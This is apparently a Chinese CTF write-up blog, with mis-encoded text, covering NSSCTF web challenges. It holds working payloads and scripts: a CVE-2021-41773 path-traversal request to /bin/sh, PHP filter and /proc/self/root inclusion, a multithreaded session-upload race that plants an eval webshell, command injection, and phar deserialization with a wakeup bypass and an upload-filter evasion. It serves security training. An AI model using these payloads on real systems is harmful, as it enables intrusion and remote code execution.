id="NSSRound-4-SWPU-ez-rce"><a href="#NSSRound-4-SWPU-ez-rce" class="headerlink" title="[NSSRound#4 SWPU]ez_rce"></a>[NSSRound#4 SWPU]ez_rce</h2><p>è€ƒç‚¹</p><p><strong>CVE-2021-41773</strong></p><p><a href="https://blog.csdn.net/weixin_45260839/article/details/125113167">CVE-2021-41773(42013) Apache HTTP Serverè·¯å¾„ç©¿è¶Šæ¼æ´å¤ç°</a></p><p><img src="../images/image-20230324192225432.png" alt="image-20230324192225432"></p><p><strong>payload</strong></p><p>bp  â€”&gt;  POSTå‘åŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230324192317206.png" alt="image-20230324192317206"></p><p>å› ä¸ºè¿™é‡Œçš„è¯flagè—çš„æœ‰ç‚¹æ·±ï¼Œç›´æ¥æŸ¥æ‰¾ä¸å‡ºæ¥æ‰€ä»¥å°±å¾—åˆ©ç”¨grepå‘½ä»¤</p><h2 id="NSSRound-8-Basic-MyDoor"><a href="#NSSRound-8-Basic-MyDoor" class="headerlink" title="[NSSRound#8 Basic]MyDoor"></a>[NSSRound#8 Basic]MyDoor</h2><p>è€ƒç‚¹</p><p><img src="../images/image-20230324192432327.png" alt="image-20230324192432327"></p><p>è¿™é‡Œçš„è¯é¢˜ç›®çš„urlç»™äº†url/index.php?file=  ç„¶åå°±çŒœä¸€ä¸‹ä¼ªåè®®ï¼Œç„¶åæ‹¿åˆ°æºç ï¼Œç„¶åç›´æ¥rceå°±è¡Œï¼Œåœ¨envé‡Œ</p><h2 id="NSSRound-8-Basic-MyPage"><a href="#NSSRound-8-Basic-MyPage" class="headerlink" title="[NSSRound#8 Basic]MyPage"></a>[NSSRound#8 Basic]MyPage</h2><p>è€ƒç‚¹</p><p><img src="../images/image-20230324193048319.png" alt="image-20230324193048319"></p><p>é¢˜ç›®</p><p><img src="../images/image-20230327172616273.png" alt="image-20230327172616273"></p><p>è¿˜æ˜¯æ–‡ä»¶åŒ…å«(åªä¸è¿‡è¿™é‡Œçš„è¯æ˜¯ç›´æ¥ç”¨phpä¸ºåè®®æ˜¯ç”¨ä¸äº†çš„)</p><p><img src="../images/image-20230327172750597.png" alt="image-20230327172750597"></p><p><img src="../images/image-20230327175508778.png" alt="image-20230327175508778"></p><p><strong>è¿˜æœ‰ä¸€ä¸ªæ˜¯pearcmdæ–‡ä»¶åŒ…å«</strong></p><p>ä¸Šé¢å¤§æ¦‚å°±æ˜¯æ–‡ä»¶åŒ…å«çš„æ€è·¯äº†</p><p><strong>æ–¹æ³•1</strong></p><p>sessionæ–‡ä»¶åŒ…å«(showé‡Œé¢ä¹Ÿæœ‰)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading  <span class="comment"># å¤šçº¿ç¨‹</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> cffi.backend_ctypes <span class="keyword">import</span> xrange</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;http://43.143.7.127:28242/&#x27;</span></span><br><span class="line">file = <span class="string">&#x27;ph0ebus.txt&#x27;</span>  <span class="comment"># ä¸Šä¼ æ–‡ä»¶å</span></span><br><span class="line">f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)  <span class="comment"># æ–‡ä»¶å†…å®¹ï¼Œæ’å…¥å¤§é‡åƒåœ¾å­—ç¬¦æ¥ä½¿è¿”å›çš„æ—¶é—´æ›´ä¹…ï¼Œè¿™æ ·ä¸´æ—¶æ–‡ä»¶ä¿å­˜çš„æ—¶é—´æ›´é•¿</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        session.post(target, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">                     files=&#123;<span class="string">&#x27;file&#x27;</span>: (file, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;target&#125;</span>index.php?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&amp;cmd=system(&#x27;cat index.php&#x27;);&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+]retry&quot;</span>)</span><br><span class="line">            <span class="comment"># print(resp.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">30</span>):  <span class="comment"># æ¯æ¬¡è°ƒç”¨è¿”å›å…¶ä¸­çš„ä¸€ä¸ªå€¼ï¼Œå†…å­˜ç©ºé—´ä½¿ç”¨æå°‘ï¼Œå› è€Œæ€§èƒ½éå¸¸å¥½</span></span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">            <span class="comment"># targetï¼šåœ¨runæ–¹æ³•ä¸­è°ƒç”¨çš„å¯è°ƒç”¨å¯¹è±¡ï¼Œå³éœ€è¦å¼€å¯çº¿ç¨‹çš„å¯è°ƒç”¨å¯¹è±¡ï¼Œæ¯”å¦‚å‡½æ•°æˆ–æ–¹æ³•ï¼›argsï¼šåœ¨å‚æ•°targetä¸­ä¼ å…¥çš„å¯è°ƒç”¨å¯¹è±¡çš„å‚æ•°å…ƒç»„ï¼Œé»˜è®¤ä¸ºç©ºå…ƒç»„()</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>æ–¹æ³•äºŒ</strong></p><p>ç”¨ä¸Šé¢çš„è„šæœ¬æŠŠé¢˜ç›®æºç ç»™æ•´å‡ºæ¥äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/index.php?file=&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ¶‰åŠåˆ°ä¸€ä¸ªæ–°çš„ä¸œè¥¿å«  <code>include_once</code></p><p><img src="../images/image-20230327211231920.png" alt="image-20230327211231920"></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/cwd/index.php</span></span><br></pre></td></tr></table></figure><h2 id="NSSRound-7-Team-ec-RCE"><a href="#NSSRound-7-Team-ec-RCE" class="headerlink" title="[NSSRound#7 Team]ec_RCE"></a>[NSSRound#7 Team]ec_RCE</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- A EZ RCE IN REALWORLD _ FROM CHINA.TW --&gt;</span><br><span class="line">&lt;!-- By æ¢å§¬ --&gt;</span><br><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>]))</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;LANG=zh_TW.utf8&#x27;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>].<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;/var/packages/Java8/target/j2sdk-image/bin/java -jar jar/NCHU.jar <span class="subst">$action</span> <span class="subst">$data</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>å°±æ˜¯é ä¸ªç¬¦å·åˆ†éš”ç¬¦çš„å«ä¹‰</strong>      &amp;      &amp;&amp;     ||     ï¼›</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=;&amp;data=<span class="string">&#x27;cat /flag&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="NSSRound-1-Basic-sql-by-sql"><a href="#NSSRound-1-Basic-sql-by-sql" class="headerlink" title="[NSSRound#1 Basic]sql_by_sql"></a>[NSSRound#1 Basic]sql_by_sql</h2><p><strong>è€ƒç‚¹</strong></p><p><img src="../images/image-20230327212719856.png" alt="image-20230327212719856"></p><p><img src="../images/image-20230327213330424.png" alt="image-20230327213330424"></p><p>æºç ç»™æç¤ºï¼Œå°±æ˜¯ç»™äº†æ³¨å…¥ç‚¹äº†ï¼Œç„¶åç›´æ¥å»æ³¨å…¥å°±è¡Œäº†</p><p><a href="https://www.cnblogs.com/z2n3/p/16127279.html">è¿™ç¯‡æ–‡ç« å¯ä»¥</a></p><p>å°±æ˜¯å¯¹è¿™é“é¢˜è®²è§£çš„éå¸¸è¯¦ç»†</p><h2 id="NSSRound-4-SWPU-1zweb-revenge"><a href="#NSSRound-4-SWPU-1zweb-revenge" class="headerlink" title="[NSSRound#4 SWPU]1zweb(revenge)"></a>[NSSRound#4 SWPU]1zweb(revenge)</h2><p>è€ƒç‚¹</p><p><img src="../images/image-20230327213500110.png" alt="image-20230327213500110"></p><p>é¢˜ç›®</p><p><img src="../images/image-20230327221113520.png" alt="image-20230327221113520"></p><p>è¿™é‡Œå°±æ˜¯ç»™ä½ æŸ¥å‡ºæºç ï¼Œç„¶åç»™ä½ è‡ªå·±å®¡è®¡çš„è¿‡ç¨‹</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;ljt&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;dky&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ljt===<span class="string">&quot;Misc&quot;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;dky===<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è§¦å‘ç‚¹å°±æ˜¯<code>file_get_contents()</code>ï¼Œè¿™ä¸ªä¼šè§¦å‘pharååºåˆ—åŒ–</p><p>é‚£ä¹ˆè¿™é‡Œçš„è¯å°±åªéœ€è¦ç»•è¿‡wakeupå°±è¡Œäº†</p><p><strong>ç”Ÿæˆpharæ–‡ä»¶</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">LoveNss</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment"># ä¸‹é¢è¿™éƒ¨åˆ†å°±æ²¡æ”¹</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;poc.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>è¿è¡Œåä¼šç”Ÿæˆpoc.phar</p><p>ç„¶åä¿®æ”¹ä¸€ä¸‹å€¼æ¥ç»•è¿‡wakeup(å°±æ˜¯ä¿®æ”¹è¿™ä¸ªç±»é‡Œè¾¹å±æ€§çš„æ•°é‡å°±è¡Œ)</p><p>ç”±äºéœ€è¦ç»•è¿‡wakeupï¼Œå› ä¸ºæ˜¯åé¢è‡ªå·±å»æ”¹çš„æ•°æ®ï¼Œè€Œ<code>phar</code>æ–‡ä»¶çš„ç­¾åæ˜¯ç¬¬ä¸€æ¬¡ç”Ÿæˆæ–‡ä»¶çš„æ—¶å€™è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬ä¿®æ”¹æ•°æ®è¿‡åï¼Œç”±äºç­¾åé”™è¯¯ï¼Œè¿™ä¸ª<code>phar</code>æ˜¯æ— æ³•è¢«æ­£å¸¸è§£æçš„ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹ç­¾åï¼Œè®©ä»–å˜æˆä¸€ä¸ªæ­£å¸¸çš„pharæ–‡ä»¶è¿˜éœ€è¦å¯¹pharæ–‡ä»¶è¿›è¡Œä¿®æ”¹ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"> </span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;poc.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read() <span class="comment"># éœ€è¦é‡æ–°ç”Ÿæˆç­¾åçš„pharæ–‡ä»¶</span></span><br><span class="line"> </span><br><span class="line">data = file[:-<span class="number">28</span>] <span class="comment"># è·å–éœ€è¦ç­¾åçš„æ•°æ®</span></span><br><span class="line"> </span><br><span class="line">final = file[-<span class="number">8</span>:] <span class="comment"># è·å–æœ€å8ä½GBMBæ ‡è¯†å’Œç­¾åç±»å‹</span></span><br><span class="line"> </span><br><span class="line">newfile = data+sha1(data).digest()+final <span class="comment"># æ•°æ® + ç­¾å + ç±»å‹ + GBMB</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;newpoc.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(newfile) <span class="comment"># å†™å…¥åˆ°æ–°çš„pharæ–‡ä»¶</span></span><br></pre></td></tr></table></figure><p>æ–°ç”Ÿæˆçš„pharåŒ…åï¼Œæˆ‘ä»¬å°±å»æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶ä¸Šä¼ çš„ä»£ç </p><p><strong>upload.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ä¸Šä¼ å¼‚å¸¸&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>)))&#123;</span><br><span class="line">        <span class="variable">$content</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$content</span>, <span class="string">&quot;__HALT_COMPILER();&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">gettype</span>(<span class="variable">$pos</span>)===<span class="string">&quot;integer&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ltjä¸€çœ¼å°±å‘ç°äº†phar&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; æ–‡ä»¶å·²ç»å­˜åœ¨&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$content</span>);</span><br><span class="line">                <span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;ä¸Šä¼ æˆåŠŸ ./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;dkyä¸å–œæ¬¢è¿™ä¸ªæ–‡ä»¶ .&quot;</span>.<span class="variable">$extension</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹æ–‡ä»¶ååç¼€è¿›è¡Œäº†ç™½åå•ï¼Œä¹Ÿå¯¹pharæ–‡ä»¶å†…å®¹è¿›è¡Œäº†æ£€æµ‹ï¼Œä¼ªäº†ç»•è¿‡è¿™ä¸¤ç‚¹</p><p>å°†æ–‡ä»¶å‹ç¼©ä¸ºzipæ–‡ä»¶ï¼Œå¹¶æŠŠåç¼€æ”¹ä¸ºpngæ–‡ä»¶ï¼Œè¿™æ ·æ–‡ä»¶å†…å®¹å’Œåç¼€ç™½åå•æ£€æµ‹éƒ½ç»•è¿‡äº†(å¯èƒ½å°±æ˜¯è§£å‹æˆzipæ–‡ä»¶åï¼Œpharæ ‡å¿—æ€§çš„ä¸œè¥¿<code>__HALT_COMPILER();</code>å°±æ£€æµ‹ä¸åˆ°äº†)</p><p><strong>phar://ä¼ªåè®®</strong><br><strong>è¿™ä¸ªå°±æ˜¯phpè§£å‹ç¼©æŠ¥çš„ä¸€ä¸ªå‡½æ•°ï¼Œä¸ç®¡åç¼€æ˜¯ä»€ä¹ˆï¼Œéƒ½ä¼šå½“åšå‹ç¼©åŒ…æ¥è§£å‹ï¼Œç”¨æ³•ï¼š?file=phar://å‹ç¼©åŒ…/å†…éƒ¨æ–‡ä»¶ phar://xxx.png/shell.php æ³¨æ„ 